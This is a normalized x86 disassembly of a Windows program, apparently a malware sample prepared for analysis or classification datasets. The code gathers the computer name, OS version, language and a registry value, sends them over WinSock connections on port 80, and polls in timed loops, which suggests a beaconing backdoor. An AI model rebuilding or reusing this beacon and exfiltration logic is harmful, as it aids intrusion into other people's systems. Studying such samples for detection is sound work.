mov ecx [ rw-data ]
mov [ esp + 0x24 ] dl
mov edx [ rw-data ]
mov [ esp + 0x5c ] eax
mov ax [ rw-data ]
mov [ esp + 0x60 ] ecx
mov cl [ rw-data ]
mov [ esp + 0x64 ] edx
mov edx [ rw-data ]
mov [ esp + 0x68 ] ax
mov [ esp + 0x6a ] cl
mov [ esp + 0x30 ] edx
mov eax [ rw-data ]
mov cx [ rw-data ]
mov edx [ rw-data ]
mov [ esp + 0x34 ] eax
mov eax [ rw-data ]
mov [ esp + 0x38 ] cx
mov ecx [ rw-data ]
mov [ esp + 0xa0 ] eax
mov eax [ rw-data ]
mov [ esp + 0x9c ] edx
mov edx [ rw-data ]
mov [ esp + 0x28 ] eax
mov eax [ rw-data ]
mov [ esp + 0xa4 ] ecx
mov ecx [ rw-data ]
mov [ esp + 0xa8 ] edx
mov edx [ rw-data ]
mov [ esp + 0x70 ] eax
mov [ esp + 0x2c ] ecx
mov ecx [ rw-data ]
mov [ esp + 0x6c ] edx
mov dx [ rw-data ]
lea eax [ esp + 0xbc ]
push 0x11
push eax
mov [ esp + 0x7c ] ecx
mov [ esp + 0x80 ] dx
call sub_402060
lea ecx [ esp + 0xb4 ]
push 0xd
push ecx
call sub_402060
lea edx [ esp + 0x9c ]
push 0xe
push edx
call sub_402060
lea eax [ esp + 0x54 ]
push 0xe
push eax
call sub_402060
lea ecx [ esp + 0x9c ]
push 0x9
push ecx
call sub_402060
lea edx [ esp + 0x38 ]
push 0x8
push edx
call sub_402060
lea eax [ esp + 0x7c ]
push 0xe
push eax
call sub_402060
lea ecx [ esp + 0x54 ]
push 0x8
push ecx
call sub_402060
add esp 0x40
lea edx [ esp + 0x5c ]
push 0xe
push edx
call sub_402060
lea eax [ esp + 0x38 ]
push 0x9
push eax
call sub_402060
lea ecx [ esp + 0xac ]
push 0xf
push ecx
call sub_402060
lea edx [ esp + 0x40 ]
push 0x7
push edx
call sub_402060
lea eax [ esp + 0x8c ]
push 0xd
push eax
call sub_402060
push 0x3e800
call sub_408e82
add esp 0x2c
mov ebx eax
test ebx ebx
jne r-xdata
lea ecx [ esp + 0xc ]
push 0x0
push ecx
push ebx
push 0x0
lea edx [ esp + 0x4c ]
push rw-data
push edx
lea eax [ esp + 0xd4 ]
push 0x50
push eax
call sub_402b30
add esp 0x20
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
add esp 0x2c4
retn
mov ecx [ esp + 0xc ]
push ecx
push ebx
call sub_402060
mov edx [ esp + 0x14 ]
add esp 0x8
lea eax [ esp + 0x88 ]
lea ecx [ esp + 0xd0 ]
push eax
mov [ edx + ebx ] 0x0
push ecx
mov [ esp + 0x90 ] 0x200
call [ GetComputerNameA@IAT ]
lea edx [ esp + 0x30 ]
push edx
push ebx
call sub_4093b0
mov edx eax
add esp 0x8
test edx edx
je r-xdata
lea ecx [ esp + 0xc ]
push eax
push ecx
push ebx
push eax
lea edx [ esp + 0x4c ]
push rw-data
push edx
lea eax [ esp + 0xc4 ]
push 0x50
push eax
call sub_402b30
add esp 0x20
test eax eax
jne r-xdata
lea ecx [ esp + 0x9c ]
push ecx
push ebx
call sub_4093b0
mov edx eax
add esp 0x8
test edx edx
je r-xdata
lea eax [ esp + 0xd0 ]
push 0x1
push eax
lea edi [ esp + 0x38 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
add ecx edx
push ecx
call sub_402160
add esp 0xc
test eax eax
je r-xdata
lea ecx [ esp + 0xc ]
push eax
push ecx
push ebx
push eax
lea edx [ esp + 0x4c ]
push rw-data
push edx
lea eax [ esp + 0xa4 ]
push 0x50
push eax
call sub_402b30
add esp 0x20
test eax eax
jne r-xdata
lea ecx [ esp + 0x28 ]
push ecx
push ebx
call sub_4093b0
mov edx eax
add esp 0x8
test edx edx
je r-xdata
lea eax [ esp + 0xd0 ]
push 0x1
push eax
lea edi [ esp + 0xa4 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
add ecx edx
push ecx
call sub_402160
add esp 0xc
test eax eax
je r-xdata
push ebx
call sub_4091a9
add esp 0x4
mov eax 0x1
pop edi
pop esi
pop ebx
add esp 0x2c4
retn
push ebx
call sub_4091a9
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebx
add esp 0x2c4
retn
lea edx [ esp + 0x6c ]
push edx
push ebx
call sub_4093b0
mov edx eax
add esp 0x8
test edx edx
je r-xdata
lea edi [ esp + 0x28 ]
or ecx 0xffffffff
xor eax eax
push 0x0
[ edi ]
not ecx
dec ecx
push rw-data
add ecx edx
push ecx
call sub_402160
add esp 0xc
test eax eax
je r-xdata
push ebx
call sub_4091a9
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebx
add esp 0x2c4
retn
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0xd0 ]
[ edi ]
not ecx
sub edi ecx
push ebp
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0xd4 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
lea eax [ esp + 0x20 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
push ebx
call sub_4093b0
add esp 0x8
mov edx eax
test edx edx
pop ebp
je r-xdata
lea edi [ esp + 0x6c ]
or ecx 0xffffffff
xor eax eax
push 0x0
[ edi ]
not ecx
dec ecx
push rw-data
add ecx edx
push ecx
call sub_402160
add esp 0xc
test eax eax
je r-xdata
push ebx
call sub_4091a9
add esp 0x4
mov eax 0x1
pop edi
pop esi
pop ebx
add esp 0x2c4
retn
lea edx [ esp + 0x5c ]
push edx
push ebx
call sub_4093b0
mov edx eax
add esp 0x8
test edx edx
je r-xdata
lea ecx [ esp + 0xd0 ]
push 0x1
push ecx
lea edi [ esp + 0x24 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
add ecx edx
push ecx
call sub_402160
add esp 0xc
test eax eax
je r-xdata
push ebx
call sub_4091a9
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebx
add esp 0x2c4
retn
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0xd0 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x10 ]
push ecx
push ebx
call sub_4093b0
mov edx eax
add esp 0x8
test edx edx
je r-xdata
lea eax [ esp + 0xd0 ]
push 0x1
push eax
lea edi [ esp + 0x64 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
add ecx edx
push ecx
call sub_402160
add esp 0xc
test eax eax
je r-xdata
push ebx
call sub_4091a9
add esp 0x4
mov eax 0x1
pop edi
pop esi
pop ebx
add esp 0x2c4
retn
lea ecx [ esp + 0x4c ]
push ecx
push ebx
call sub_4093b0
mov edx eax
add esp 0x8
test edx edx
je r-xdata
lea eax [ esp + 0xd0 ]
push 0x1
push eax
lea edi [ esp + 0x18 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
add ecx edx
push ecx
call sub_402160
add esp 0xc
test eax eax
je r-xdata
push ebx
call sub_4091a9
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebx
add esp 0x2c4
retn
lea ecx [ esp + 0x7c ]
push ecx
push ebx
call sub_4093b0
push ebx
mov esi eax
call sub_4091a9
add esp 0xc
xor eax eax
test esi esi
pop edi
pop esi
setne al
pop ebx
add esp 0x2c4
retn
lea eax [ esp + 0xd0 ]
push 0x1
push eax
lea edi [ esp + 0x54 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
add ecx edx
push ecx
call sub_402160
add esp 0xc
test eax eax
je r-xdata
push ebx
call sub_4091a9
add esp 0x4
mov eax 0x1
pop edi
pop esi
pop ebx
add esp 0x2c4
retn
push ebx
call sub_4091a9
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebx
add esp 0x2c4
retn
sub_4029a0
push ebx
push esi
mov esi [ esp + 0xc ]
push edi
mov ecx 0x27
xor eax eax
mov edi esi
push esi
[ edi ]
mov edi [ GetVersionExA@IAT ]
mov [ esi ] 0x9c
call edi
test eax eax
jne r-xdata
call [ GetSystemDefaultLangID@IAT ]
mov [ rw-data ] ax
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
lea edx [ esi + 0x14 ]
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
pop ebx
retn
push esi
mov [ esi ] 0x94
call edi
sub_402a10
sub esp 0x108
push esi
lea eax [ esp + 0x4 ]
push edi
push eax
push 0x1
push 0x0
push rw-data
push 0x80000001
mov [ esp + 0x20 ] 0x4
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
pop edi
xor eax eax
pop esi
add esp 0x108
retn
mov edx [ esp + 0x8 ]
mov esi [ RegQueryValueExA@IAT ]
lea ecx [ esp + 0xc ]
push ecx
push rw-data
push eax
push eax
push rw-data
push edx
call esi
mov edx [ esp + 0x8 ]
mov edi eax
lea eax [ esp + 0xc ]
lea ecx [ esp + 0x10 ]
push eax
push ecx
push 0x0
push 0x0
push rw-data
push edx
mov [ esp + 0x24 ] 0x100
call esi
mov esi eax
mov eax [ esp + 0x8 ]
push eax
call [ RegCloseKey@IAT ]
test edi edi
jne r-xdata
test esi esi
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
lea ecx [ esp + 0x10 ]
push rw-data
push ecx
call sub_4093b0
mov esi eax
add esp 0x8
test esi esi
je r-xdata
lea esi [ esp + 0x10 ]
add esi 0x5
jmp r-xdata
push ebx
push 0x3a
push esi
call sub_4092f0
mov ebx eax
push esi
mov [ ebx ] 0x0
call sub_403c20
mov edi eax
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
inc ebx
[ edi ] [ esi ]
push ebx
call sub_4094bb
add esp 0x10
mov [ rw-data ] eax
mov eax 0x1
pop ebx
pop edi
pop esi
add esp 0x108
retn
sub_402b30
mov eax 0x2120
call sub_4094d0
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x2134 ]
push edi
call sub_403c20
add esp 0x4
push eax
call [ Ordinal_WSOCK32_10@IAT ]
mov ebp [ esp + 0x2138 ]
push 0x0
push 0x1
push 0x2
mov esi eax
call [ Ordinal_WSOCK32_23@IAT ]
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x2120
retn
lea eax [ esp + 0x18 ]
mov [ esp + 0x18 ] 0x1
push eax
push 0x8004667e
push ebx
call [ Ordinal_WSOCK32_12@IAT ]
mov eax [ rw-data ]
mov [ esp + 0x10 ] 0x3c
test eax eax
mov [ esp + 0x14 ] 0x0
mov [ esp + 0x30 ] ebx
mov [ esp + 0x2c ] 0x1
je r-xdata
push ebp
mov [ esp + 0x20 ] 0x2
call [ Ordinal_WSOCK32_9@IAT ]
lea ecx [ esp + 0x1c ]
push 0x10
push ecx
push ebx
mov [ esp + 0x2a ] ax
mov [ esp + 0x2c ] esi
call [ rw-data ]
lea edx [ esp + 0x10 ]
lea ecx [ esp + 0x2c ]
push edx
push 0x0
lea eax [ ebx + 0x1 ]
push ecx
push 0x0
push eax
call [ Ordinal_WSOCK32_18@IAT ]
test eax eax
jle r-xdata
push rw-data
call [ Ordinal_WSOCK32_10@IAT ]
mov ebp [ rw-data ]
mov esi eax
push ebx
mov ebp [ esp + 0x2144 ]
mov edx [ esp + 0x2150 ]
mov eax [ esp + 0x213c ]
mov ecx [ esp + 0x2138 ]
push ebp
push edx
push eax
push ecx
lea edx [ esp + 0x140 ]
push edi
push edx
call sub_403760
lea edi [ esp + 0x148 ]
or ecx 0xffffffff
xor eax eax
add esp 0x18
[ edi ]
not ecx
mov esi [ esp + 0x2140 ]
dec ecx
mov eax ecx
mov ecx ebp
mov edx ecx
push 0x0
lea edi [ esp + eax + 0x134 ]
add eax ebp
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
push eax
lea eax [ esp + 0x138 ]
and ecx 0x3
push eax
push ebx
[ edi ] [ esi ]
call [ rw-data ]
cmp [ esp + 0x2150 ] 0x1
jne r-xdata
push ebx
call sub_403a50
add esp 0x4
cmp eax 0xffffffff
je r-xdata
lea ecx [ esp + 0x10 ]
lea edx [ esp + 0x2c ]
push ecx
push 0x0
push edx
lea eax [ ebx + 0x1 ]
push 0x0
push eax
call [ Ordinal_WSOCK32_18@IAT ]
test eax eax
push ebx
jle r-xdata
cmp eax 0x3e800
jge r-xdata
call [ Ordinal_WSOCK32_3@IAT ]
call [ Ordinal_WSOCK32_3@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x2120
retn
mov edi [ esp + 0x2148 ]
mov ebp [ Ordinal_WSOCK32_16@IAT ]
xor esi esi
mov edx 0x3e800
push 0x0
sub edx esi
lea eax [ esi + edi ]
push edx
push eax
push ebx
call ebp
cmp eax 0xffffffff
je r-xdata
test eax eax
je r-xdata
push ebx
call [ Ordinal_WSOCK32_3@IAT ]
mov ecx [ esp + 0x214c ]
pop edi
mov eax 0x1
mov [ ecx ] esi
pop esi
pop ebp
pop ebx
add esp 0x2120
retn
add esi eax
cmp esi 0x3e800
jl r-xdata
lea eax [ esp + 0x10 ]
lea ecx [ esp + 0x2c ]
push eax
push 0x0
push 0x0
lea eax [ ebx + 0x1 ]
push ecx
push eax
call [ Ordinal_WSOCK32_18@IAT ]
test eax eax
jle r-xdata
sub_402d60
push ecx
push esi
push 0x3e800
call sub_408e82
mov esi eax
add esp 0x4
test esi esi
jne r-xdata
lea eax [ esp + 0x4 ]
push 0x0
push eax
push esi
push 0x0
push rw-data
push rw-data
push 0x50
push rw-data
call sub_402b30
add esp 0x20
test eax eax
jne r-xdata
pop esi
pop ecx
retn
mov ecx [ esi ]
xor edx edx
mov [ rw-data ] ecx
mov dx [ esi + 0x4 ]
xor eax eax
mov [ rw-data ] edx
mov ax [ esi + 0x6 ]
xor ecx ecx
mov [ rw-data ] eax
mov cx [ esi + 0x8 ]
push esi
mov [ rw-data ] ecx
call sub_4091a9
add esp 0x4
mov eax 0x1
pop esi
pop ecx
retn
push esi
call sub_4091a9
add esp 0x4
xor eax eax
pop esi
pop ecx
retn
sub_402df0
sub esp 0x588
push ebp
push esi
push rw-data
call [ LoadLibraryA@IAT ]
mov esi eax
push rw-data
push esi
call [ GetProcAddress@IAT ]
push esi
mov ebp eax
call [ FreeLibrary@IAT ]
push 0x3e800
call sub_408e82
add esp 0x4
mov [ esp + 0x8 ] eax
test eax eax
jne r-xdata
push ebx
push edi
or ecx 0xffffffff
mov edi rw-data
xor eax eax
lea edx [ esp + 0x198 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
shr ecx 0x2
mov edi edx
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
mov edi rw-data
mov ebx ecx
or ecx 0xffffffff
inc ebx
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + ebx + 0x198 ]
mov eax ecx
mov esi edi
mov edi edx
mov edx [ rw-data ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
mov esi rw-data
lea ebx [ ebx + ecx + 0x1 ]
mov ecx 0x27
lea edi [ esp + ebx + 0x198 ]
add ebx 0x9c
[ edi ] [ esi ]
mov cx [ rw-data ]
lea edi [ esp + 0x23 ]
mov [ esp + ebx + 0x198 ] cx
mov ecx [ rw-data ]
add ebx 0x2
test edx edx
setne al
mov [ esp + ebx + 0x198 ] al
mov eax [ rw-data ]
inc ebx
mov [ esp + 0x18 ] eax
mov ax [ rw-data ]
mov [ esp + ebx + 0x198 ] ecx
mov ecx [ rw-data ]
mov [ esp + 0x1c ] ecx
mov cl [ rw-data ]
mov [ esp + 0x20 ] ax
mov [ esp + 0x22 ] cl
mov ecx 0x1d
xor eax eax
[ edi ]
add ebx 0x4
test edx edx
stosb [ edi ]
je r-xdata
pop esi
pop ebp
add esp 0x588
retn
lea ecx [ esp + 0x18 ]
lea edx [ esp + 0x98 ]
push ecx
push rw-data
push rw-data
push edx
call sub_409157
lea edi [ esp + 0xa8 ]
or ecx 0xffffffff
xor eax eax
add esp 0x10
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + ebx + 0x198 ]
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x98 ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
lea ebx [ ebx + ecx + 0x1 ]
call ebp
xor edx edx
mov esi 0x36ee80
mov ecx eax
div esi
mov eax 0x45e7b273
mul edx
shr edx 0xe
mov eax 0x95217cb1
push edx
mul ecx
shr edx 0x15
push edx
lea ecx [ esp + 0xa0 ]
push rw-data
push ecx
call sub_409157
lea edi [ esp + 0xa8 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + ebx + 0x1a8 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0xa8 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0xa8 ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
mov edi rw-data
lea ebx [ ebx + ecx + 0x1 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
push 0x2f
[ edi ] [ esi ]
lea ecx [ esp + 0xac ]
push ecx
call sub_409000
mov edx eax
mov edi rw-data
or ecx 0xffffffff
xor eax eax
add esp 0x18
lea ebp [ esp + ebx + 0x198 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi ebp
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
test edx edx
[ edi ] [ esi ]
je r-xdata
mov edx [ rw-data ]
lea eax [ esp + 0x18 ]
push edx
push rw-data
push rw-data
push eax
call sub_409157
add esp 0x10
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + ebx + 0x198 ]
[ edi ]
not ecx
sub edi ecx
push 0x1
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x19c ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
mov edi [ esp + 0x14 ]
mov eax [ rw-data ]
not ecx
dec ecx
lea ebx [ ebx + ecx + 0x1 ]
lea ecx [ esp + 0x18 ]
push ecx
mov ecx [ rw-data ]
push edi
push ebx
push edx
push rw-data
push eax
push ecx
call [ Ordinal_WSOCK32_11@IAT ]
push eax
call sub_402b30
push edi
mov esi eax
call sub_4091a9
add esp 0x24
mov eax esi
pop edi
pop ebx
pop esi
pop ebp
add esp 0x588
retn
lea edi [ esp + 0x98 ]
or ecx 0xffffffff
xor eax eax
mov [ edx ] 0x0
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
lea edi [ esp + 0x98 ]
mov edx ecx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
add ecx ebx
lea ebx [ ecx + edx + 0x1 ]
sub_403170
push ecx
push esi
push 0x3e800
call sub_408e82
mov esi eax
add esp 0x4
test esi esi
jne r-xdata
lea eax [ esp + 0x4 ]
push 0x0
push eax
push esi
push 0x0
push rw-data
push rw-data
push 0x50
push rw-data
call sub_402b30
add esp 0x20
test eax eax
jne r-xdata
pop esi
pop ecx
retn
mov ecx [ esp + 0x4 ]
push edi
push ecx
push esi
call sub_4031e0
push esi
mov edi eax
call sub_4091a9
add esp 0xc
mov eax edi
pop edi
pop esi
pop ecx
retn
push esi
call sub_4091a9
add esp 0x4
xor eax eax
pop esi
pop ecx
retn
sub_4031e0
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x18 ]
xor ebp ebp
test edi edi
jle r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
mov edx [ esp + 0x14 ]
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
pop edi
add ecx ebp
pop esi
pop ebp
pop ebx
mov ecx [ ecx + edx + 0x1 ]
mov edx [ rw-data ]
cmp ecx edx
sete al
retn
inc ebp
cmp ebp edi
jl r-xdata
xor eax eax
jmp r-xdata
mov bl [ eax + 0x1 ]
mov cl bl
cmp bl [ esi + 0x1 ]
jne r-xdata
mov esi rw-data
lea eax [ edx + ebp ]
test eax eax
je r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov bl [ eax ]
mov cl bl
cmp bl [ esi ]
jne r-xdata
sub_403260
push ebx
push ebp
push esi
push edi
push rw-data
call [ LoadLibraryA@IAT ]
mov esi eax
push rw-data
push esi
call [ GetProcAddress@IAT ]
push esi
mov ebp eax
call [ FreeLibrary@IAT ]
mov ebx [ esp + 0x18 ]
xor esi esi
lea edi [ ebx + ebx * 4 + 0x3a98 ]
shl edi 0x1
call ebp
test ebx ebx
mov [ rw-data ] eax
jle r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
mov ebp [ esp + 0x14 ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
mov edx [ rw-data ]
mov eax ebx
sub eax esi
push 0x0
lea ecx [ esi + ebp ]
push eax
push ecx
push edx
call [ rw-data ]
cmp eax 0xffffffff
jne r-xdata
add esi eax
mov eax ebx
sub eax esi
add eax 0xbb8
lea edi [ eax + eax * 4 ]
shl edi 0x1
call [ Ordinal_WSOCK32_111@IAT ]
cmp eax 0x2733
jne r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov [ rw-data ] 0x0
push 0x1
call [ rw-data ]
mov eax edi
dec edi
test eax eax
je r-xdata
jmp r-xdata
cmp esi ebx
jl r-xdata
sub_403320
sub esp 0x200
push esi
mov esi [ esp + 0x208 ]
cmp [ esi ] 0x41
je r-xdata
push edi
mov edx [ rw-data ]
mov ecx 0x80
xor eax eax
lea edi [ esp + 0x8 ]
[ edi ]
mov ecx [ esi + 0x1 ]
mov eax [ rw-data ]
push ecx
push 0x1
push rw-data
push edx
push eax
call [ Ordinal_WSOCK32_11@IAT ]
lea ecx [ esp + 0x18 ]
push eax
push ecx
call sub_403760
lea edi [ esp + 0x20 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x20 ]
[ edi ]
not ecx
dec ecx
push ecx
push edx
call sub_403260
add esp 0x20
test eax eax
pop edi
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ esp + 0x20c ]
push eax
push esi
call sub_403260
add esp 0x8
pop esi
add esp 0x200
retn
pop esi
add esp 0x200
retn
mov eax [ rw-data ]
mov [ rw-data ] 0x1
push eax
mov [ rw-data ] 0x0
call [ Ordinal_WSOCK32_3@IAT ]
mov eax [ rw-data ]
test eax eax
jne r-xdata
call sub_403c50
test eax eax
jne r-xdata
push 0x1
call [ rw-data ]
mov eax [ rw-data ]
test eax eax
je r-xdata
pop esi
add esp 0x200
retn
sub_403400
push ecx
push ebx
push 0x3e800
call sub_408e82
mov ebx eax
add esp 0x4
test ebx ebx
je r-xdata
pop ebx
pop ecx
retn
push esi
xor esi esi
push edi
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
push ebx
call sub_4091a9
add esp 0x4
pop esi
inc esi
cmp esi 0xa
jl r-xdata
lea eax [ esp + 0x8 ]
push 0x0
push eax
push ebx
push 0x0
push rw-data
push rw-data
push 0x50
push rw-data
call sub_402b30
add esp 0x20
test eax eax
jne r-xdata
push ebx
call sub_4091a9
add esp 0x4
pop esi
pop ebx
pop ecx
retn
sub_4034c0
push rw-data
call sub_4089e0
add esp 0x4
test eax eax
jne r-xdata
push rw-data
call sub_408700
add esp 0x4
test eax eax
jne r-xdata
retn
push rw-data
push rw-data
call sub_408820
add esp 0x8
retn
retn
sub_403550
sub esp 0x408
lea eax [ esp + 0x8 ]
push ebx
push ebp
push esi
push edi
push 0x400
push eax
call [ rw-data ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x18 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea eax [ esp + 0x18 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call [ rw-data ]
lea ecx [ esp + 0x18 ]
push 0x400
push ecx
call [ rw-data ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x18 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea eax [ esp + 0x18 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call [ rw-data ]
lea ecx [ esp + 0x18 ]
push 0x400
push ecx
call [ rw-data ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x18 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea eax [ esp + 0x18 ]
and ecx 0x3
[ edi ] [ esi ]
push eax
call [ rw-data ]
mov edi [ Ordinal_WSOCK32_12@IAT ]
mov ebp [ CreateThread@IAT ]
mov esi 0x1
xor ebx ebx
mov [ rw-data ] esi
push 0x32
mov [ rw-data ] ebx
mov [ rw-data ] ebx
call [ rw-data ]
call sub_403490
test eax eax
jne r-xdata
push eax
call [ Ordinal_WSOCK32_3@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x408
retn
call sub_4034c0
test eax eax
jne r-xdata
call sub_402d60
test eax eax
jne r-xdata
call sub_402df0
test eax eax
jne r-xdata
push 0x1d4c0
call [ rw-data ]
jmp r-xdata
call sub_403170
test eax eax
jne r-xdata
push 0x2710
call [ rw-data ]
jmp r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ebx
cmp eax ebx
mov [ rw-data ] ebx
je r-xdata
call sub_403c50
test eax eax
jne r-xdata
push 0x2710
call [ rw-data ]
jmp r-xdata
mov edx [ rw-data ]
lea ecx [ esp + 0x10 ]
push ecx
push 0x8004667e
push edx
mov [ esp + 0x1c ] esi
call edi
lea eax [ esp + 0x14 ]
mov [ rw-data ] esi
push eax
push ebx
push ebx
push r-xdata
push ebx
push ebx
mov [ rw-data ] bl
call ebp
mov [ rw-data ] esi
push 0x2710
call [ rw-data ]
jmp r-xdata
cmp [ rw-data ] ebx
je r-xdata
call sub_403e80
push esi
call [ rw-data ]
jmp r-xdata
cmp [ rw-data ] ebx
je r-xdata
sub_403760
sub esp 0x10
mov ecx [ esp + 0x1c ]
push ebx
push esi
push edi
lea eax [ esp + 0xd ]
push 0xa
push eax
push ecx
mov [ esp + 0x18 ] 0x3a
call sub_410496
mov edx [ esp + 0x3c ]
add esp 0xc
test edx edx
mov edi rw-data
je r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
mov ebx [ esp + 0x20 ]
push ebp
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov eax [ rw-data ]
test eax eax
je r-xdata
mov edi rw-data
mov edi [ esp + 0x30 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
cmp edx 0x1
[ edi ] [ esi ]
jne r-xdata
or ecx 0xffffffff
mov edi rw-data
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov ebp ecx
mov esi edi
or ecx 0xffffffff
mov edi ebx
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
